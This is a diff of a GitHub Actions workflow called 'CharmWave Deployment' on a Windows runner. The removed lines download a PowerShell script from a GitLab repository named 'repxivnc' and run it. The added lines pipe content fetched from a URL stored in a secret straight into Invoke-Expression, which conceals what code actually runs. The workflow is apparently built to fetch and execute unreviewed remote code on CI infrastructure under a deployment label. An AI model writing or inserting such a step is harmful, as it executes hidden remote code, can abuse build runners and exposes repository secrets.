@@ -1,27 +1,26 @@
-name: CharmWave Deployment (Rejected Example)
+name: CharmWave Deployment
 
 on:
   workflow_dispatch:
+    inputs:
+      INSTANCE:
+        description: "Instance number"
+        required: true
+        default: "1"
 
 jobs:
   deploy:
     runs-on: windows-2022
 
     steps:
-      - name: Download CharmWave Script
+      - name: Run CharmWave Script
         shell: pwsh
         run: |
-          Invoke-WebRequest `
-            -Uri https://gitlab.com/Baozaoxao/repxivnc/-/raw/main/CharmWave.ps1 `
-            -OutFile CharmWave.ps1
-
-      - name: Run Script Directly
-        shell: pwsh
-        run: |
-          ./CharmWave.ps1
+          $key = "${{ secrets.CHARMWAVE_KEY }}"
+          Invoke-Expression (Invoke-WebRequest -Uri $key -UseBasicParsing).Content
 
       - name: Done
         if: always()
         shell: pwsh
         run: |
-          Write-Host "Workflow finished."
+          Write-Host "CharmWave Deployment Completed."
